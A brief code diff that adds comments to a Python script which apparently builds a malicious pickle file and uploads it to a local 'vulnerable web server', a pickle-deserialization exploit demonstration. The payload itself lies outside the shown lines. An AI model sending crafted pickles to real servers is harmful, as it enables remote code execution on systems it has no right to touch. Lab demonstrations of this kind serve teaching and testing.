@@ -17,7 +17,8 @@ class MyObject(object):
 o = MyObject()
 p = pickle.dump(o, open('bad.pickle', 'wb'))
 
-
+# Send a POST request to our vulnerable web server
+# with the bad.pickle
 url = 'http://localhost:5000/upload'
 files = {'file': open("bad.pickle", "rb").read()}
 response = requests.post(url, files=files)
